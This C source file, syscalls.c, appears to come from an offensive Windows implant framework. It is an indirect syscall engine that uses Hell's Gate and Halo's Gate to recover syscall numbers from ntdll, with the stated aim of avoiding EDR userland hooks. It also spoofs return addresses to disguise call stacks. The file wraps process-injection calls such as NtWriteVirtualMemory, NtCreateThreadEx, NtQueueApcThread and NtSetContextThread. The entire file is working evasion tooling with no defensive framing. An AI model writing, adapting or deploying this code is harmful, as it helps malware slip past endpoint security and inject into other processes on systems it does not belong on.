/**
 * syscalls.c - Indirect Syscall Engine
 *
 * Implements Hell's Gate and Halo's Gate techniques for resolving
 * syscall numbers (SSNs) at runtime from ntdll.dll without relying
 * on hardcoded values. Supports indirect syscall invocation to avoid
 * userland hooks placed by EDR.
 */

#include <windows.h>
#include <intrin.h>
#include "../../include/evasion.h"
#include "../../include/peb.h"
#include "../../include/syscalls.h"
#include "../../include/obfuscate.h"
#include "../../include/iat_obf.h"

// PE parsing helpers
#define RVA2VA(base, rva) ((LPVOID)((ULONG_PTR)(base) + (DWORD)(rva)))

typedef struct _SYSCALL_ENTRY {
    DWORD  hash;      // djb2 hash of function name
    WORD   ssn;       // System Service Number
    PVOID  address;   // Address of syscall instruction in ntdll
} SYSCALL_ENTRY;

#define MAX_SYSCALLS       512
#define SYSCALL_SCAN_MAX   500

static SYSCALL_ENTRY g_syscall_table[MAX_SYSCALLS];
static int g_syscall_count = 0;
static BOOL g_initialized = FALSE;

static HMODULE g_ntdll_base = NULL;
static PBYTE   g_text_start = NULL;
static PBYTE   g_text_end   = NULL;

// DJB2 hash (compile-time compatible)
static DWORD hash_function_name(const char* name) {
    DWORD hash = 5381;
    int c;
    while ((c = *name++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

static BOOL init_ntdll_text_bounds(HMODULE ntdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS nt = RVA2VA(ntdll, dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0 ||
            (sections[i].Characteristics & IMAGE_SCN_CNT_CODE)) {
            g_text_start = (PBYTE)ntdll + sections[i].VirtualAddress;
            g_text_end = g_text_start + sections[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL is_in_text_section(PBYTE addr) {
    return g_text_start && g_text_end &&
           addr >= g_text_start && addr < g_text_end;
}

static BOOL is_readable_range(PBYTE addr, SIZE_T len) {
    if (!is_in_text_section(addr)) return FALSE;
    return (addr + len) <= g_text_end;
}

// Check if bytes at address are a syscall stub (mov eax, SSN pattern)
// Pattern: 4C 8B D1 B8 XX XX 00 00 (mov r10, rcx; mov eax, SSN)
static BOOL is_syscall_stub(PBYTE address, PWORD out_ssn) {
    if (!is_readable_range(address, 8)) return FALSE;

    if (address[0] == 0x4C && address[1] == 0x8B && address[2] == 0xD1 &&
        address[3] == 0xB8) {
        *out_ssn = *(PWORD)(address + 4);
        return TRUE;
    }
    return FALSE;
}

// Halo's Gate: when a stub is hooked, look at neighbors to infer SSN
static BOOL halos_gate_resolve(PBYTE func_address, PWORD out_ssn) {
    if (!is_in_text_section(func_address)) return FALSE;

    for (int i = 1; i < 25; i++) {
        PBYTE neighbor_up = func_address - (i * 32);
        WORD ssn_up;
        if (is_readable_range(neighbor_up, 8) && is_syscall_stub(neighbor_up, &ssn_up)) {
            *out_ssn = ssn_up + (WORD)i;
            return TRUE;
        }

        PBYTE neighbor_down = func_address + (i * 32);
        WORD ssn_down;
        if (is_readable_range(neighbor_down, 8) && is_syscall_stub(neighbor_down, &ssn_down)) {
            *out_ssn = ssn_down - (WORD)i;
            return TRUE;
        }
    }

    /* Fallback: Win11+ may use non-uniform stub spacing — scan ±512 bytes */
    for (int dist = 1; dist <= 16; dist++) {
        int byte_off = dist * 32;
        PBYTE up = func_address - byte_off;
        PBYTE down = func_address + byte_off;
        WORD ssn_up, ssn_down;

        if (is_readable_range(up, 8) && is_syscall_stub(up, &ssn_up)) {
            *out_ssn = ssn_up + (WORD)dist;
            return TRUE;
        }
        if (is_readable_range(down, 8) && is_syscall_stub(down, &ssn_down)) {
            *out_ssn = ssn_down - (WORD)dist;
            return TRUE;
        }
    }

    for (int offset = -512; offset <= 512; offset++) {
        int stub_dist;
        PBYTE candidate;
        WORD neighbor_ssn;

        if (offset == 0 || (offset % 32) != 0)
            continue;

        stub_dist = offset / 32;
        candidate = func_address + offset;
        if (!is_readable_range(candidate, 8) || !is_syscall_stub(candidate, &neighbor_ssn))
            continue;

        if (stub_dist > 0)
            *out_ssn = neighbor_ssn - (WORD)stub_dist;
        else
            *out_ssn = neighbor_ssn + (WORD)(-stub_dist);
        return TRUE;
    }

    return FALSE;
}

static PVOID scan_for_syscall_ret(PBYTE start, PBYTE end) {
    if (!start || !end || start >= end) return NULL;

    for (PBYTE p = start; p + 2 < end; p++) {
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
            return p;
        }
    }
    return NULL;
}

// Find the syscall; ret instruction in ntdll for indirect calling
static PVOID find_syscall_instruction(PBYTE func_address) {
    if (!is_in_text_section(func_address)) return NULL;

    PBYTE scan_end = func_address + SYSCALL_SCAN_MAX;
    if (scan_end > g_text_end) scan_end = g_text_end;

    PVOID found = scan_for_syscall_ret(func_address, scan_end);
    if (found) return found;

    for (int neighbor = 1; neighbor < 25; neighbor++) {
        PBYTE nfunc = func_address + (neighbor * 32);
        if (!is_readable_range(nfunc, 3)) continue;

        PBYTE n_end = nfunc + SYSCALL_SCAN_MAX;
        if (n_end > g_text_end) n_end = g_text_end;

        found = scan_for_syscall_ret(nfunc, n_end);
        if (found) return found;
    }
    return NULL;
}

// Initialize the syscall table by parsing ntdll's export directory
BOOL syscall_init(void) {
    if (g_initialized) return TRUE;

    PJAGER_PEB peb = jager_read_peb();
    if (!peb || !peb->Ldr) return FALSE;

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    HMODULE ntdll = NULL;

    while (entry != head) {
        PJAGER_LDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, JAGER_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (mod->FullDllName.Buffer) {
            PWCHAR name = mod->FullDllName.Buffer;
            int len = mod->FullDllName.Length / sizeof(WCHAR);
            if (len >= 9) {
                PWCHAR suffix = name + len - 9;
                if ((suffix[0] == 'n' || suffix[0] == 'N') &&
                    (suffix[1] == 't' || suffix[1] == 'T') &&
                    (suffix[2] == 'd' || suffix[2] == 'D') &&
                    (suffix[3] == 'l' || suffix[3] == 'L') &&
                    (suffix[4] == 'l' || suffix[4] == 'L')) {
                    ntdll = (HMODULE)mod->DllBase;
                    break;
                }
            }
        }
        entry = entry->Flink;
    }

    if (!ntdll) return FALSE;

    g_ntdll_base = ntdll;
    if (!init_ntdll_text_bounds(ntdll)) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = RVA2VA(ntdll, dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = RVA2VA(ntdll,
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD names = RVA2VA(ntdll, exports->AddressOfNames);
    PDWORD funcs = RVA2VA(ntdll, exports->AddressOfFunctions);
    PWORD ordinals = RVA2VA(ntdll, exports->AddressOfNameOrdinals);

    g_syscall_count = 0;

    for (DWORD i = 0; i < exports->NumberOfNames && g_syscall_count < MAX_SYSCALLS; i++) {
        char* name = RVA2VA(ntdll, names[i]);

        if (name[0] == 'N' && name[1] == 't') {
            PBYTE func_addr = RVA2VA(ntdll, funcs[ordinals[i]]);
            WORD ssn;

            if (is_syscall_stub(func_addr, &ssn)) {
                g_syscall_table[g_syscall_count].hash = hash_function_name(name);
                g_syscall_table[g_syscall_count].ssn = ssn;
                g_syscall_table[g_syscall_count].address = find_syscall_instruction(func_addr);
                g_syscall_count++;
            } else if (halos_gate_resolve(func_addr, &ssn)) {
                g_syscall_table[g_syscall_count].hash = hash_function_name(name);
                g_syscall_table[g_syscall_count].ssn = ssn;
                g_syscall_table[g_syscall_count].address = find_syscall_instruction(func_addr);
                g_syscall_count++;
            }
        }
    }

    g_initialized = TRUE;
    init_return_spoof();
    return g_syscall_count > 0;
}

BOOL syscall_resolve(DWORD func_hash, PWORD out_ssn, PVOID* out_addr) {
    if (!g_initialized && !syscall_init()) {
        return FALSE;
    }

    for (int i = 0; i < g_syscall_count; i++) {
        if (g_syscall_table[i].hash == func_hash) {
            *out_ssn = g_syscall_table[i].ssn;
            *out_addr = g_syscall_table[i].address;
            return TRUE;
        }
    }
    return FALSE;
}

BOOL syscall_resolve_name(const char* name, PWORD out_ssn, PVOID* out_addr) {
    DWORD hash = hash_function_name(name);
    return syscall_resolve(hash, out_ssn, out_addr);
}

int syscall_get_count(void) {
    return g_syscall_count;
}

/* --- Indirect syscall wrappers --- */

__declspec(thread) WORD g_syscall_ssn = 0;
__declspec(thread) PVOID g_syscall_gadget = NULL;

static BOOL prepare_syscall(DWORD func_hash, PWORD out_ssn, PVOID *out_gadget) {
    return syscall_resolve(func_hash, out_ssn, out_gadget);
}

static NTSTATUS invoke_syscall(DWORD func_hash) {
    WORD ssn = 0;
    PVOID gadget = NULL;
    if (!prepare_syscall(func_hash, &ssn, &gadget) || !gadget)
        return STATUS_UNSUCCESSFUL;
    g_syscall_ssn = ssn;
    g_syscall_gadget = gadget;
    if (return_spoof_ready())
        return_spoof_apply();
    return STATUS_SUCCESS;
}

#define SYSCALL_PREP(hash) do { \
    NTSTATUS _st = invoke_syscall(hash); \
    if (_st != STATUS_SUCCESS) return _st; \
} while (0)

NTSTATUS sys_NtAllocateVirtualMemory(
    HANDLE proc, PVOID *base, SIZE_T *size, ULONG type, ULONG protect)
{
    SYSCALL_PREP(HASH_NtAllocateVirtualMemory);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, base, 0, size, type, protect);
}

NTSTATUS sys_NtProtectVirtualMemory(
    HANDLE proc, PVOID *base, SIZE_T *size, ULONG new_prot, PULONG old_prot)
{
    SYSCALL_PREP(HASH_NtProtectVirtualMemory);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, base, size, new_prot, old_prot);
}

NTSTATUS sys_NtWriteVirtualMemory(
    HANDLE proc, PVOID base, PVOID buf, SIZE_T size, PSIZE_T written)
{
    SYSCALL_PREP(HASH_NtWriteVirtualMemory);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, base, buf, size, written);
}

NTSTATUS sys_NtReadVirtualMemory(
    HANDLE proc, PVOID base, PVOID buf, SIZE_T size, PSIZE_T read)
{
    SYSCALL_PREP(HASH_NtReadVirtualMemory);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, base, buf, size, read);
}

NTSTATUS sys_NtOpenProcess(
    PHANDLE process, ACCESS_MASK access, PVOID obj_attr, PVOID client_id)
{
    SYSCALL_PREP(HASH_NtOpenProcess);
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(process, access, obj_attr, client_id);
}

NTSTATUS sys_NtCreateThreadEx(
    PHANDLE thread, ACCESS_MASK access, PVOID obj_attr, HANDLE proc,
    PVOID start, PVOID param, ULONG flags, SIZE_T zero,
    SIZE_T commit, SIZE_T reserve, PVOID attr_list)
{
    SYSCALL_PREP(HASH_NtCreateThreadEx);
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                   PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(thread, access, obj_attr, proc, start, param, flags,
              zero, commit, reserve, attr_list);
}

NTSTATUS sys_NtOpenSection(PHANDLE section, ACCESS_MASK access, PVOID obj_attr) {
    SYSCALL_PREP(HASH_NtOpenSection);
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, PVOID);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(section, access, obj_attr);
}

NTSTATUS sys_NtMapViewOfSection(
    HANDLE section, HANDLE proc, PVOID *base, ULONG_PTR zero_bits,
    SIZE_T commit, PLARGE_INTEGER offset, PSIZE_T view_size,
    DWORD inherit, ULONG alloc_type, ULONG protect)
{
    SYSCALL_PREP(HASH_NtMapViewOfSection);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
                                   PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(section, proc, base, zero_bits, commit, offset, view_size,
              inherit, alloc_type, protect);
}

NTSTATUS sys_NtUnmapViewOfSection(HANDLE proc, PVOID base) {
    SYSCALL_PREP(HASH_NtUnmapViewOfSection);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, base);
}

NTSTATUS sys_NtCreateSection(
    PHANDLE section, ACCESS_MASK access, PVOID obj_attr, PLARGE_INTEGER max_size,
    ULONG protect, ULONG alloc_attr, HANDLE file_handle)
{
    SYSCALL_PREP(HASH_NtCreateSection);
    typedef NTSTATUS (NTAPI *fn_t)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER,
                                   ULONG, ULONG, HANDLE);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(section, access, obj_attr, max_size, protect, alloc_attr, file_handle);
}

NTSTATUS sys_NtQueueApcThread(
    HANDLE thread, PVOID apc_routine, PVOID arg1, PVOID arg2, PVOID arg3)
{
    SYSCALL_PREP(HASH_NtQueueApcThread);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(thread, apc_routine, arg1, arg2, arg3);
}

NTSTATUS sys_NtFreeVirtualMemory(
    HANDLE proc, PVOID *base, PSIZE_T size, ULONG free_type)
{
    SYSCALL_PREP(HASH_NtFreeVirtualMemory);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID *, PSIZE_T, ULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, base, size, free_type);
}

NTSTATUS sys_NtQueryVirtualMemory(
    HANDLE proc, PVOID base, int info_class, PVOID info,
    SIZE_T info_len, PSIZE_T ret_len)
{
    SYSCALL_PREP(HASH_NtQueryVirtualMemory);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID, int, PVOID, SIZE_T, PSIZE_T);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, base, info_class, info, info_len, ret_len);
}

NTSTATUS sys_NtSetContextThread(HANDLE thread, PCONTEXT ctx) {
    SYSCALL_PREP(HASH_NtSetContextThread);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PCONTEXT);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(thread, ctx);
}

NTSTATUS sys_NtGetContextThread(HANDLE thread, PCONTEXT ctx) {
    SYSCALL_PREP(HASH_NtGetContextThread);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PCONTEXT);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(thread, ctx);
}

NTSTATUS sys_NtResumeThread(HANDLE thread, PULONG prev_suspend_count) {
    SYSCALL_PREP(HASH_NtResumeThread);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(thread, prev_suspend_count);
}

NTSTATUS sys_NtSuspendThread(HANDLE thread, PULONG prev_suspend_count) {
    SYSCALL_PREP(HASH_NtSuspendThread);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(thread, prev_suspend_count);
}

NTSTATUS sys_NtDuplicateObject(
    HANDLE src_proc, HANDLE src_handle, HANDLE tgt_proc, PHANDLE tgt_handle,
    ACCESS_MASK access, ULONG handle_attrs, ULONG options)
{
    SYSCALL_PREP(HASH_NtDuplicateObject);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, HANDLE, HANDLE, PHANDLE,
                                   ACCESS_MASK, ULONG, ULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(src_proc, src_handle, tgt_proc, tgt_handle,
              access, handle_attrs, options);
}

NTSTATUS sys_NtQueryInformationProcess(
    HANDLE proc, ULONG info_class, PVOID info, ULONG info_len, PULONG ret_len)
{
    SYSCALL_PREP(HASH_NtQueryInformationProcess);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, info_class, info, info_len, ret_len);
}

NTSTATUS sys_NtTerminateProcess(HANDLE proc, NTSTATUS exit_status) {
    SYSCALL_PREP(HASH_NtTerminateProcess);
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, NTSTATUS);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(proc, exit_status);
}

NTSTATUS sys_NtDelayExecution(BOOLEAN alertable, PLARGE_INTEGER delay) {
    SYSCALL_PREP(HASH_NtDelayExecution);
    typedef NTSTATUS (NTAPI *fn_t)(BOOLEAN, PLARGE_INTEGER);
    fn_t fn = (fn_t)(void *)syscall_trampoline;
    return fn(alertable, delay);
}

BOOL jager_protect_memory(HANDLE proc, PVOID addr, SIZE_T size, ULONG prot, PULONG old) {
    PVOID base = addr;
    SIZE_T region = size;
    return sys_NtProtectVirtualMemory(proc, &base, &region, prot, old) == STATUS_SUCCESS;
}

void spoof_init(void) {
    extern void spoof_set_fake_ret(PVOID);
    extern void spoof_return(void);
    HMODULE ntdll = get_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll)
        ntdll = GetModuleHandleA(OBF("ntdll.dll"));
    FARPROC rtl = ntdll ? resolve_api(ntdll, api_hash("RtlUserThreadStart")) : NULL;
    if (!rtl)
        rtl = (FARPROC)(void *)spoof_return;
    spoof_set_fake_ret(rtl);
}
